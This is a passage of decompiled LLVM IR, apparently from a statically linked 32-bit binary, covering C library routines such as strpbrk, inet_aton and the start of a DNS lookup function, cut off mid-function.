dec_label_pc_804eb6e:                             ; preds = %dec_label_pc_804eb5e
  %v0_804eb72 = load i32, i32* @ebx, align 4
  %v5_804eb72 = inttoptr i32 %v0_804eb72 to i8*
  %v8_804eb73 = call i32 @rawmemchr(i8* %v5_804eb72, i32 0, i32 %v8_804eb62, i32 %v8_804eb62)
  br label %dec_label_pc_804eb81

dec_label_pc_804eb7d:                             ; preds = %dec_label_pc_804eb5e
  %v9_804eb62 = inttoptr i32 %v8_804eb62 to i8*
  store i8 0, i8* %v9_804eb62, align 1
  %v2_804eb80 = add i32 %v8_804eb62, 1
  br label %dec_label_pc_804eb81

dec_label_pc_804eb81:                             ; preds = %dec_label_pc_804eb6e, %dec_label_pc_804eb7d
  %storemerge = phi i32 [ %v2_804eb80, %dec_label_pc_804eb7d ], [ %v8_804eb73, %dec_label_pc_804eb6e ]
  %v0_804eb81 = phi i32 [ %v2_804eb80, %dec_label_pc_804eb7d ], [ %v8_804eb73, %dec_label_pc_804eb6e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804eb81 = load i32, i32* @esi, align 4
  %v2_804eb81 = inttoptr i32 %v1_804eb81 to i32*
  store i32 %v0_804eb81, i32* %v2_804eb81, align 4
  %v0_804eb83 = load i32, i32* @ebx, align 4
  store i32 %v0_804eb83, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804eb85

dec_label_pc_804eb85:                             ; preds = %dec_label_pc_804eb58, %dec_label_pc_804eb81
  %v0_804eb88 = phi i32 [ %v0_804eb88.pre, %dec_label_pc_804eb58 ], [ %v0_804eb83, %dec_label_pc_804eb81 ]
  %v2_804eb85 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804eb85, i32* @ebx, align 4
  store i32 %v0_804eb31, i32* @esi, align 4
  store i32 %v0_804eb30, i32* @edi, align 4
  ret i32 %v0_804eb88

; uselistorder directives
  uselistorder i32 %v8_804eb62, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804eb85, { 1, 0 }
  uselistorder label %dec_label_pc_804eb81, { 1, 0 }
  uselistorder label %dec_label_pc_804eb45, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804eb8d = load i32, i32* @ebx, align 4
  %v2_804eba424 = load i8, i8* %arg1, align 1
  %v4_804eba628 = icmp eq i8 %v2_804eba424, 0
  br i1 %v4_804eba628, label %dec_label_pc_804ebae, label %dec_label_pc_804ebaa.lr.ph

dec_label_pc_804ebaa.lr.ph:                       ; preds = %entry
  %v3_804eba425 = zext i8 %v2_804eba424 to i32
  %v5_804eba426 = and i32 %v0_804eb8d, -256
  %v6_804eba427 = or i32 %v3_804eba425, %v5_804eba426
  %v4_804eb92 = ptrtoint i8* %arg1 to i32
  %v1_804eb9d13 = inttoptr i32 %arg2 to i8*
  %v4_804eb9d.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ebaa

dec_label_pc_804eb98:                             ; preds = %dec_label_pc_804ebaa, %dec_label_pc_804eb9c
  %v6_804eb9d22 = phi i32 [ %v6_804eb9d, %dec_label_pc_804eb9c ], [ %v6_804eb9d17, %dec_label_pc_804ebaa ]
  %v2_804eb9d21 = phi i8 [ %v2_804eb9d, %dec_label_pc_804eb9c ], [ %v2_804eb9d14, %dec_label_pc_804ebaa ]
  %v0_804eb9c20 = phi i32 [ %v1_804eb9c, %dec_label_pc_804eb9c ], [ %arg2, %dec_label_pc_804ebaa ]
  %v15_804eb98 = icmp eq i8 %v2_804eb9d21, %v2_804eba431
  br i1 %v15_804eb98, label %dec_label_pc_804ebb0, label %dec_label_pc_804eb9c

dec_label_pc_804eb9c:                             ; preds = %dec_label_pc_804eb98
  %v1_804eb9c = add i32 %v0_804eb9c20, 1
  %v1_804eb9d = inttoptr i32 %v1_804eb9c to i8*
  %v2_804eb9d = load i8, i8* %v1_804eb9d, align 1
  %v3_804eb9d = zext i8 %v2_804eb9d to i32
  %v5_804eb9d = and i32 %v6_804eb9d22, -256
  %v6_804eb9d = or i32 %v3_804eb9d, %v5_804eb9d
  %v4_804eb9f = icmp eq i8 %v2_804eb9d, 0
  %v1_804eba1 = icmp eq i1 %v4_804eb9f, false
  br i1 %v1_804eba1, label %dec_label_pc_804eb98, label %dec_label_pc_804eba3

dec_label_pc_804eba3:                             ; preds = %dec_label_pc_804eb9c, %dec_label_pc_804ebaa
  %v4_804eb9d.pre34 = phi i32 [ %v6_804eb9d17, %dec_label_pc_804ebaa ], [ %v6_804eb9d, %dec_label_pc_804eb9c ]
  %v1_804eba3 = add i32 %v0_804eba329, 1
  %v1_804eba4 = inttoptr i32 %v1_804eba3 to i8*
  %v2_804eba4 = load i8, i8* %v1_804eba4, align 1
  %v3_804eba4 = zext i8 %v2_804eba4 to i32
  %v5_804eba4 = and i32 %v6_804eba432, -256
  %v6_804eba4 = or i32 %v3_804eba4, %v5_804eba4
  %v4_804eba6 = icmp eq i8 %v2_804eba4, 0
  br i1 %v4_804eba6, label %dec_label_pc_804ebae, label %dec_label_pc_804ebaa

dec_label_pc_804ebaa:                             ; preds = %dec_label_pc_804ebaa.lr.ph, %dec_label_pc_804eba3
  %v4_804eb9d.pre = phi i32 [ %v4_804eb9d.pre.pre, %dec_label_pc_804ebaa.lr.ph ], [ %v4_804eb9d.pre34, %dec_label_pc_804eba3 ]
  %v6_804eba432 = phi i32 [ %v6_804eba427, %dec_label_pc_804ebaa.lr.ph ], [ %v6_804eba4, %dec_label_pc_804eba3 ]
  %v2_804eba431 = phi i8 [ %v2_804eba424, %dec_label_pc_804ebaa.lr.ph ], [ %v2_804eba4, %dec_label_pc_804eba3 ]
  %v0_804eba329 = phi i32 [ %v4_804eb92, %dec_label_pc_804ebaa.lr.ph ], [ %v1_804eba3, %dec_label_pc_804eba3 ]
  %v2_804eb9d14 = load i8, i8* %v1_804eb9d13, align 1
  %v3_804eb9d15 = zext i8 %v2_804eb9d14 to i32
  %v5_804eb9d16 = and i32 %v4_804eb9d.pre, -256
  %v6_804eb9d17 = or i32 %v3_804eb9d15, %v5_804eb9d16
  %v4_804eb9f18 = icmp eq i8 %v2_804eb9d14, 0
  %v1_804eba119 = icmp eq i1 %v4_804eb9f18, false
  br i1 %v1_804eba119, label %dec_label_pc_804eb98, label %dec_label_pc_804eba3

dec_label_pc_804ebae:                             ; preds = %dec_label_pc_804eba3, %entry
  br label %dec_label_pc_804ebb0

dec_label_pc_804ebb0:                             ; preds = %dec_label_pc_804eb98, %dec_label_pc_804ebae
  %v0_804ebb2 = phi i32 [ 0, %dec_label_pc_804ebae ], [ %v0_804eba329, %dec_label_pc_804eb98 ]
  store i32 %v0_804eb8d, i32* @ebx, align 4
  ret i32 %v0_804ebb2

; uselistorder directives
  uselistorder i8 %v2_804eb9d14, { 1, 2, 0 }
  uselistorder i32 %v1_804eba3, { 1, 0 }
  uselistorder i32 %v6_804eb9d, { 1, 0 }
  uselistorder i8 %v2_804eb9d, { 1, 2, 0 }
  uselistorder i32 %v1_804eb9c, { 1, 0 }
  uselistorder i8 %v2_804eba424, { 0, 2, 1 }
  uselistorder i32 %v0_804eb8d, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ebb0, { 1, 0 }
  uselistorder label %dec_label_pc_804ebaa, { 1, 0 }
  uselistorder label %dec_label_pc_804eba3, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804ebbb = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ebbb, i32* @ecx, align 4
  %v1_804ebbf = icmp eq i8* %arg1, null
  br i1 %v1_804ebbf, label %dec_label_pc_804ec40, label %dec_label_pc_804ebc3

dec_label_pc_804ebc3:                             ; preds = %entry
  %v0_804ebd1.pre = load i32, i32* @global_var_8054320, align 32
  br label %dec_label_pc_804ebce

dec_label_pc_804ebce:                             ; preds = %dec_label_pc_804ebc3, %dec_label_pc_804ec17
  %v2_804ec1a35 = phi i32 [ 1, %dec_label_pc_804ebc3 ], [ %v3_804ec1a, %dec_label_pc_804ec17 ]
  %v0_804ebce34 = phi i32 [ %v4_804ebbb, %dec_label_pc_804ebc3 ], [ %v0_804ebce3, %dec_label_pc_804ec17 ]
  %v0_804ec3533 = phi i32 [ 0, %dec_label_pc_804ebc3 ], [ %v2_804ec1d, %dec_label_pc_804ec17 ]
  %v1_804ebce = inttoptr i32 %v0_804ebce34 to i8*
  %v2_804ebce = load i8, i8* %v1_804ebce, align 1
  %v3_804ebce = sext i8 %v2_804ebce to i32
  %v2_804ebd7 = mul nsw i32 %v3_804ebce, 2
  %v3_804ebd7 = add i32 %v2_804ebd7, %v0_804ebd1.pre
  %v4_804ebd7 = inttoptr i32 %v3_804ebd7 to i8*
  %v5_804ebd7 = load i8, i8* %v4_804ebd7, align 1
  %v6_804ebd7 = and i8 %v5_804ebd7, 8
  %v7_804ebd7 = icmp eq i8 %v6_804ebd7, 0
  br i1 %v7_804ebd7, label %dec_label_pc_804ec40, label %dec_label_pc_804ebde

dec_label_pc_804ebde:                             ; preds = %dec_label_pc_804ebce
  %v4_804ebf2.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ebf2

dec_label_pc_804ebe2:                             ; preds = %dec_label_pc_804ebf2
  %v3_804ebe2 = mul i32 %v1_804ebe2, 10
  %v2_804ebe5 = add i32 %v3_804ebe2, -48
  %v3_804ebe5 = add i32 %v2_804ebe5, %v2_804ebf4
  %v1_804ebe9 = add i32 %v3_804ebe5, -255
  %v6_804ebe9 = sub i32 254, %v3_804ebe5
  %v7_804ebe9 = and i32 %v6_804ebe9, %v3_804ebe5
  %v8_804ebe9 = icmp slt i32 %v7_804ebe9, 0
  %v9_804ebe9 = icmp eq i32 %v1_804ebe9, 0
  %v10_804ebe9 = icmp slt i32 %v1_804ebe9, 0
  %v3_804ebef = icmp eq i1 %v10_804ebe9, %v8_804ebe9
  %v4_804ebef = icmp eq i1 %v9_804ebe9, false
  %v5_804ebef = and i1 %v4_804ebef, %v3_804ebef
  br i1 %v5_804ebef, label %dec_label_pc_804ec40, label %dec_label_pc_804ebf1

dec_label_pc_804ebf1:                             ; preds = %dec_label_pc_804ebe2
  %v1_804ebf1 = add i32 %v0_804ebf1, 1
  store i32 %v1_804ebf1, i32* @ecx, align 4
  br label %dec_label_pc_804ebf2

dec_label_pc_804ebf2:                             ; preds = %dec_label_pc_804ebde, %dec_label_pc_804ebf1
  %v1_804ebe2 = phi i32 [ 0, %dec_label_pc_804ebde ], [ %v3_804ebe5, %dec_label_pc_804ebf1 ]
  %v4_804ebf2 = phi i32 [ %v4_804ebf2.pre, %dec_label_pc_804ebde ], [ %v6_804ebf2, %dec_label_pc_804ebf1 ]
  %v0_804ebf1 = phi i32 [ %v0_804ebce34, %dec_label_pc_804ebde ], [ %v1_804ebf1, %dec_label_pc_804ebf1 ]
  %v1_804ebf2 = inttoptr i32 %v0_804ebf1 to i8*
  %v2_804ebf2 = load i8, i8* %v1_804ebf2, align 1
  %v3_804ebf2 = zext i8 %v2_804ebf2 to i32
  %v5_804ebf2 = and i32 %v4_804ebf2, -256
  %v6_804ebf2 = or i32 %v3_804ebf2, %v5_804ebf2
  store i32 %v6_804ebf2, i32* @edx, align 4
  %v2_804ebf4 = sext i8 %v2_804ebf2 to i32
  %v2_804ebf7 = mul nsw i32 %v2_804ebf4, 2
  %v3_804ebf7 = add i32 %v2_804ebf7, %v0_804ebd1.pre
  %v4_804ebf7 = inttoptr i32 %v3_804ebf7 to i16*
  %v5_804ebf7 = load i16, i16* %v4_804ebf7, align 2
  %v2_804ebfc = and i16 %v5_804ebf7, 8
  %v3_804ebfc = icmp eq i16 %v2_804ebfc, 0
  %v1_804ebfe = icmp eq i1 %v3_804ebfc, false
  br i1 %v1_804ebfe, label %dec_label_pc_804ebe2, label %dec_label_pc_804ec00

dec_label_pc_804ec00:                             ; preds = %dec_label_pc_804ebf2
  %v8_804ec00 = sub nsw i32 2, %v2_804ec1a35
  %v9_804ec00 = and i32 %v8_804ec00, %v2_804ec1a35
  %v10_804ec00 = icmp slt i32 %v9_804ec00, 0
  %v11_804ec00 = icmp eq i32 %v2_804ec1a35, 3
  %v12_804ec00 = icmp slt i32 %v2_804ec1a35, 3
  %v3_804ec04 = icmp eq i1 %v12_804ec00, %v10_804ec00
  %v4_804ec04 = icmp eq i1 %v11_804ec00, false
  %v5_804ec04 = and i1 %v4_804ec04, %v3_804ec04
  br i1 %v5_804ec04, label %dec_label_pc_804ec0e, label %dec_label_pc_804ec06

dec_label_pc_804ec06:                             ; preds = %dec_label_pc_804ec00
  %v10_804ec06 = icmp eq i8 %v2_804ebf2, 46
  %v1_804ec09 = icmp eq i1 %v10_804ec06, false
  br i1 %v1_804ec09, label %dec_label_pc_804ec40, label %dec_label_pc_804ec0b

dec_label_pc_804ec0b:                             ; preds = %dec_label_pc_804ec06
  %v1_804ec0b = add i32 %v0_804ebf1, 1
  store i32 %v1_804ec0b, i32* @ecx, align 4
  br label %dec_label_pc_804ec17

dec_label_pc_804ec0e:                             ; preds = %dec_label_pc_804ec00
  %v1_804ec0e = add i32 %v0_804ebf1, 1
  store i32 %v1_804ec0e, i32* @ecx, align 4
  %v4_804ec0f = icmp eq i8 %v2_804ebf2, 0
  br i1 %v4_804ec0f, label %dec_label_pc_804ec17, label %dec_label_pc_804ec13

dec_label_pc_804ec13:                             ; preds = %dec_label_pc_804ec0e
  %v2_804ec13 = and i16 %v5_804ebf7, 32
  %v3_804ec13 = icmp eq i16 %v2_804ec13, 0
  br i1 %v3_804ec13, label %dec_label_pc_804ec40, label %dec_label_pc_804ec17

dec_label_pc_804ec17:                             ; preds = %dec_label_pc_804ec13, %dec_label_pc_804ec0e, %dec_label_pc_804ec0b
  %v0_804ebce3 = phi i32 [ %v1_804ec0e, %dec_label_pc_804ec13 ], [ %v1_804ec0e, %dec_label_pc_804ec0e ], [ %v1_804ec0b, %dec_label_pc_804ec0b ]
  %v2_804ec17 = mul i32 %v0_804ec3533, 256
  %v3_804ec1a = add nuw nsw i32 %v2_804ec1a35, 1
  %v2_804ec1d = or i32 %v1_804ebe2, %v2_804ec17
  %v7_804ec23 = icmp sgt i32 %v2_804ec1a35, 3
  br i1 %v7_804ec23, label %dec_label_pc_804ec25, label %dec_label_pc_804ebce

dec_label_pc_804ec25:                             ; preds = %dec_label_pc_804ec17
  %v4_804ec2a = icmp eq i32 %arg2, 0
  br i1 %v4_804ec2a, label %dec_label_pc_804ec42, label %dec_label_pc_804ec31

dec_label_pc_804ec31:                             ; preds = %dec_label_pc_804ec25
  %v1_804ec35 = call i32 @llvm.bswap.i32(i32 %v2_804ec1d)
  %v2_804ec37 = inttoptr i32 %arg2 to i32*
  store i32 %v1_804ec35, i32* %v2_804ec37, align 4
  br label %dec_label_pc_804ec42

dec_label_pc_804ec40:                             ; preds = %dec_label_pc_804ec13, %dec_label_pc_804ec06, %dec_label_pc_804ebce, %dec_label_pc_804ebe2, %entry
  br label %dec_label_pc_804ec42

dec_label_pc_804ec42:                             ; preds = %dec_label_pc_804ec25, %dec_label_pc_804ec31, %dec_label_pc_804ec40
  %v0_804ec47 = phi i32 [ 1, %dec_label_pc_804ec25 ], [ 1, %dec_label_pc_804ec31 ], [ 0, %dec_label_pc_804ec40 ]
  ret i32 %v0_804ec47

; uselistorder directives
  uselistorder i32 %v2_804ebf4, { 1, 0 }
  uselistorder i32 %v6_804ebf2, { 1, 0 }
  uselistorder i8 %v2_804ebf2, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804ebf1, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804ebe9, { 1, 0 }
  uselistorder i32 %v3_804ebe5, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804ebce34, { 1, 0 }
  uselistorder i32 %v2_804ec1a35, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ec42, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ec40, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804ebf2, { 1, 0 }
  uselistorder label %dec_label_pc_804ebce, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_804ec5e = call i32 @malloc(i32 512)
  store i32 %v2_804ec5e, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_804ec5e, i32* @ebp, align 4
  %v2_804ec6c = call i32 @malloc(i32 1025)
  store i32 %v2_804ec6c, i32* %eax.global-to-local, align 4
  %v12_804ec75 = ptrtoint i32* %stack_var_-236 to i32
  %v1_804ec78 = icmp eq i32 %v2_804ec5e, 0
  br i1 %v1_804ec78, label %dec_label_pc_804f2f1, label %dec_label_pc_804ec80

dec_label_pc_804ec80:                             ; preds = %entry
  %v1_804ec80 = icmp eq i32 %v2_804ec6c, 0
  br i1 %v1_804ec80, label %dec_label_pc_804f2f1, label %dec_label_pc_804ec88

dec_label_pc_804ec88:                             ; preds = %dec_label_pc_804ec80
  %v5_804ec88 = icmp eq i32 %arg2, 0
  br i1 %v5_804ec88, label %dec_label_pc_804f2f1, label %dec_label_pc_804ec96

dec_label_pc_804ec96:                             ; preds = %dec_label_pc_804ec88
  %v4_804ec96 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ec96, i32* %eax.global-to-local, align 4
  %v2_804ec9d = load i8, i8* %arg1, align 1
  %v3_804ec9d = icmp eq i8 %v2_804ec9d, 0
  br i1 %v3_804ec9d, label %dec_label_pc_804f2f1, label %dec_label_pc_804eca6

dec_label_pc_804eca6:                             ; preds = %dec_label_pc_804ec96
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_804ecaa = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_804ecaa, i32* @eax, align 4
  store i32 %v4_804ec96, i32* %edx.global-to-local, align 4
  %v2_804eccd = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804eccd, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_804ecd5 = call i32 @__pthread_return_void(i32 %v2_804eccd, i32 134534955)
  store i32 %v3_804ecd5, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_80569e8.398 to i8*), i8** %stack_var_-252, align 4
  %v2_804ece1 = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_80569e8.398 to i32))
  %v0_804ece6 = load i64, i64* @global_var_8056a00.399, align 8
  %v1_804ece6 = trunc i64 %v0_804ece6 to i32
  %v1_804eceb = ashr i32 %v1_804ece6, 31
  %v6_804ecec = and i64 %v0_804ece6, 4294967295
  %v8_804ecec = zext i32 %v1_804eceb to i64
  %v9_804ecec = mul nuw i64 %v8_804ecec, 4294967296
  %v10_804ecec = or i64 %v9_804ecec, %v6_804ecec
  %v14_804ecec = srem i64 %v10_804ecec, %tmp33
  %v15_804ecec = trunc i64 %v14_804ecec to i32
  %v0_804ecf3 = load i16, i16* @global_var_805432c.400, align 4
  %v2_804ed02 = load i8*, i8** %stack_var_-252, align 4
  %v3_804ed02 = ptrtoint i8* %v2_804ed02 to i32
  store i32 %v3_804ed02, i32* @eax, align 4
  store i32 134534955, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_804ed07 = call i32 @__pthread_return_void(i32 %v2_804eccd, i32 1)
  store i32 %v3_804ed07, i32* %eax.global-to-local, align 4
  %v3_804ed4b = sext i16 %v0_804ecf3 to i32
  %v5_804eeae = inttoptr i32 %v15_804ecec to i8*
  %v1_804f2cc87 = add i32 %v12_804ec75, 28
  %v2_804f2cc88 = inttoptr i32 %v1_804f2cc87 to i32*
  %v3_804f2cc89 = load i32, i32* %v2_804f2cc88, align 4
  %tmp119 = icmp ult i32 %v3_804f2cc89, 3
  br i1 %tmp119, label %dec_label_pc_804ed2c, label %dec_label_pc_804f2f1

dec_label_pc_804ed2c:                             ; preds = %dec_label_pc_804eca6, %dec_label_pc_804f2cc.backedge
  %v0_804ed3392 = phi i32 [ %v0_804f2cc.pre, %dec_label_pc_804f2cc.backedge ], [ %v12_804ec75, %dec_label_pc_804eca6 ]
  %v1_804ed2c = add i32 %v0_804ed3392, 20
  %v2_804ed2c = inttoptr i32 %v1_804ed2c to i32*
  %v3_804ed2c = load i32, i32* %v2_804ed2c, align 4
  %v13_804ed2c = icmp eq i32 %v3_804ed2c, -1
  br i1 %v13_804ed2c, label %dec_label_pc_804ed2c.dec_label_pc_804ed42_crit_edge, label %dec_label_pc_804ed33

dec_label_pc_804ed2c.dec_label_pc_804ed42_crit_edge: ; preds = %dec_label_pc_804ed2c
  %v0_804ed42.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ed42

dec_label_pc_804ed33:                             ; preds = %dec_label_pc_804ed2c
  %v3_804ed36 = load i32, i32* %v2_804ed2c, align 4
  %v5_804ed36 = add i32 %v0_804ed3392, -16
  %v6_804ed36 = inttoptr i32 %v5_804ed36 to i32*
  store i32 %v3_804ed36, i32* %v6_804ed36, align 4
  %v1_804ed3a = call i32 @__libc_close(i32 -1)
  store i32 %v1_804ed3a, i32* %eax.global-to-local, align 4
  %v0_804ed3f = load i32, i32* @esp, align 4
  %v1_804ed3f = add i32 %v0_804ed3f, 16
  br label %dec_label_pc_804ed42

dec_label_pc_804ed42:                             ; preds = %dec_label_pc_804ed2c.dec_label_pc_804ed42_crit_edge, %dec_label_pc_804ed33
  %v1_804ed42 = phi i32 [ %v0_804ed3392, %dec_label_pc_804ed2c.dec_label_pc_804ed42_crit_edge ], [ %v1_804ed3f, %dec_label_pc_804ed33 ]
  %v0_804ed42 = phi i32 [ %v0_804ed42.pre, %dec_label_pc_804ed2c.dec_label_pc_804ed42_crit_edge ], [ %v1_804ed3a, %dec_label_pc_804ed33 ]
  %v2_804ed42 = add i32 %v1_804ed42, -4
  %v3_804ed42 = inttoptr i32 %v2_804ed42 to i32*
  store i32 %v0_804ed42, i32* %v3_804ed42, align 4
  %v1_804ed43 = add i32 %v1_804ed42, -8
  %v2_804ed43 = inttoptr i32 %v1_804ed43 to i32*
  store i32 512, i32* %v2_804ed43, align 4
  %v1_804ed48 = add i32 %v1_804ed42, -12
  %v2_804ed48 = inttoptr i32 %v1_804ed48 to i32*
  store i32 0, i32* %v2_804ed48, align 4
  %v2_804ed4a = add i32 %v1_804ed42, -16
  %v3_804ed4a = inttoptr i32 %v2_804ed4a to i32*
  store i32 %v2_804ec5e, i32* %v3_804ed4a, align 4
  %v5_804ed4b = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_804ecec, i32 %v3_804ed4b)
  store i32 %v5_804ed4b, i32* %eax.global-to-local, align 4
  %v0_804ed50 = load i32, i32* @esp, align 4
  %v1_804ed53 = add i32 %v0_804ed50, 8
  %v2_804ed53 = inttoptr i32 %v1_804ed53 to i32*
  store i32 48, i32* %v2_804ed53, align 4
  %v1_804ed55 = add i32 %v0_804ed50, 4
  %v2_804ed55 = inttoptr i32 %v1_804ed55 to i32*
  store i32 0, i32* %v2_804ed55, align 4
  %v1_804ed57 = add i32 %v0_804ed50, 84
  store i32 %v1_804ed57, i32* @ebx, align 4
  %v3_804ed5b = inttoptr i32 %v0_804ed50 to i32*
  store i32 %v1_804ed57, i32* %v3_804ed5b, align 4
  %v5_804ed5c = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_804ecec, i32 %v3_804ed4b)
  store i32 %v5_804ed5c, i32* %eax.global-to-local, align 4
  %v0_804ed61 = load i32, i32* @esp, align 4
  %v1_804ed61 = add i32 %v0_804ed61, 60
  %v2_804ed61 = inttoptr i32 %v1_804ed61 to i32*
  %v3_804ed61 = load i32, i32* %v2_804ed61, align 4
  store i32 %v3_804ed61, i32* %eax.global-to-local, align 4
  %v1_804ed65 = add i32 %v0_804ed61, 116
  %v2_804ed65 = inttoptr i32 %v1_804ed65 to i32*
  store i32 1, i32* %v2_804ed65, align 4
  %v0_804ed6d = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed6d = add i32 %v0_804ed6d, 1
  %v0_804ed6e = load i32, i32* @esp, align 4
  %v1_804ed6e = add i32 %v0_804ed6e, 104
  %v2_804ed6e = inttoptr i32 %v1_804ed6e to i32*
  store i32 1, i32* %v2_804ed6e, align 4
  %v1_804ed76 = urem i32 %v1_804ed6d, 65536
  store i32 %v1_804ed76, i32* %eax.global-to-local, align 4
  %v1_804ed7b = load i32, i32* @esp, align 4
  %v2_804ed7b = add i32 %v1_804ed7b, 60
  %v3_804ed7b = inttoptr i32 %v2_804ed7b to i32*
  store i32 %v1_804ed76, i32* %v3_804ed7b, align 4
  %v0_804ed7f = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed7f = load i32, i32* @esp, align 4
  %v2_804ed7f = add i32 %v1_804ed7f, 84
  %v3_804ed7f = inttoptr i32 %v2_804ed7f to i32*
  store i32 %v0_804ed7f, i32* %v3_804ed7f, align 4
  %v0_804ed83 = load i32, i32* @esp, align 4
  %v1_804ed86 = add i32 %v0_804ed83, 8
  %v2_804ed86 = inttoptr i32 %v1_804ed86 to i32*
  store i32 512, i32* %v2_804ed86, align 4
  %v2_804ed8b = add i32 %v0_804ed83, 4
  %v3_804ed8b = inttoptr i32 %v2_804ed8b to i32*
  store i32 %v2_804ec5e, i32* %v3_804ed8b, align 4
  %v0_804ed8c = load i32, i32* @ebx, align 4
  %v3_804ed8c = inttoptr i32 %v0_804ed83 to i32*
  store i32 %v0_804ed8c, i32* %v3_804ed8c, align 4
  %v0_804ed8d = call i32 @__encode_header()
  store i32 %v0_804ed8d, i32* %eax.global-to-local, align 4
  %v0_804ed92 = load i32, i32* @esp, align 4
  store i32 %v0_804ed8d, i32* @ebx, align 4
  %v2_804ed97 = icmp slt i32 %v0_804ed8d, 0
  br i1 %v2_804ed97, label %dec_label_pc_804f2f1, label %dec_label_pc_804ed9f

dec_label_pc_804ed9f:                             ; preds = %dec_label_pc_804ed42
  %v2_804ed9f = add i32 %v0_804ed92, 12
  %v3_804ed9f = inttoptr i32 %v2_804ed9f to i32*
  store i32 %v0_804ed8d, i32* %v3_804ed9f, align 4
  %v1_804eda0 = add i32 %v0_804ed92, 8
  %v2_804eda0 = inttoptr i32 %v1_804eda0 to i32*
  store i32 1025, i32* %v2_804eda0, align 4
  %v1_804eda5 = add i32 %v0_804ed92, 256
  %v2_804eda5 = inttoptr i32 %v1_804eda5 to i32*
  %v3_804eda5 = load i32, i32* %v2_804eda5, align 4
  %v5_804eda5 = add i32 %v0_804ed92, 4
  %v6_804eda5 = inttoptr i32 %v5_804eda5 to i32*
  store i32 %v3_804eda5, i32* %v6_804eda5, align 4
  %v1_804edac = add i32 %v0_804ed92, 28
  %v2_804edac = inttoptr i32 %v1_804edac to i32*
  %v3_804edac = load i32, i32* %v2_804edac, align 4
  %v6_804edac = inttoptr i32 %v0_804ed92 to i32*
  store i32 %v3_804edac, i32* %v6_804edac, align 4
  %v5_804edb0 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_804ecec, i32 %v3_804ed4b)
  %v0_804edb5 = load i32, i32* @esp, align 4
  %v1_804edb8 = add i32 %v0_804edb5, 8
  %v2_804edb8 = inttoptr i32 %v1_804edb8 to i32*
  store i32 ptrtoint (i32* @global_var_8054330.338 to i32), i32* %v2_804edb8, align 4
  %v1_804edbd = add i32 %v0_804edb5, 4
  %v2_804edbd = inttoptr i32 %v1_804edbd to i32*
  store i32 134534955, i32* %v2_804edbd, align 4
  %v1_804edc2 = add i32 %v0_804edb5, 200
  store i32 %v1_804edc2, i32* @eax, align 4
  %v3_804edc9 = inttoptr i32 %v0_804edb5 to i32*
  store i32 %v1_804edc2, i32* %v3_804edc9, align 4
  %v2_804edca = call i32 @__pthread_return_void(i32 -1, i32 %v15_804ecec)
  store i32 %v2_804edca, i32* %eax.global-to-local, align 4
  %v0_804edcf = load i32, i32* @esp, align 4
  %v1_804edcf = inttoptr i32 %v0_804edcf to i32*
  store i32 ptrtoint (i32* @global_var_8054330.338 to i32), i32* %v1_804edcf, align 4
  %v1_804edd6 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804edd6, i32* %eax.global-to-local, align 4
  %v0_804eddb = load i32, i32* @esp, align 4
  %v1_804eddb = add i32 %v0_804eddb, 56
  %v2_804eddb = inttoptr i32 %v1_804eddb to i32*
  %v3_804eddb = load i32, i32* %v2_804eddb, align 4
  store i32 %v3_804eddb, i32* %edx.global-to-local, align 4
  %v1_804eddf = add i32 %v0_804eddb, 268
  %v2_804eddf = inttoptr i32 %v1_804eddf to i32*
  %v3_804eddf = load i32, i32* %v2_804eddf, align 4
  store i32 %v3_804eddf, i32* %eax.global-to-local, align 4
  %v2_804ede6 = mul i32 %v3_804eddb, 4
